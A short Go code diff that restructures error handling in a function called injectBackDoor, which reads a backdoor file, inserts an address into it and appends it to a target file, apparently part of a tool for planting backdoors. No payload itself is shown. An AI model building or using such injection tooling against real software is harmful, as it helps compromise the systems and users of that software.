@@ -34,10 +34,10 @@ func Inject(addr data.Address, path string) error {
 
 func injectBackDoor(addr data.Address, filePath string, backdoorPath string) error {
 	backdoor, err := utils.ReadFile(backdoorPath)
-	if err == nil {
-		addAddressToString(addr, &backdoor)
-		err = utils.AppendToFile(backdoor, filePath)
+	if err != nil {
+		return err
 	}
 
-	return err
+	addAddressToString(addr, &backdoor)
+	return utils.AppendToFile(backdoor, filePath)
 }
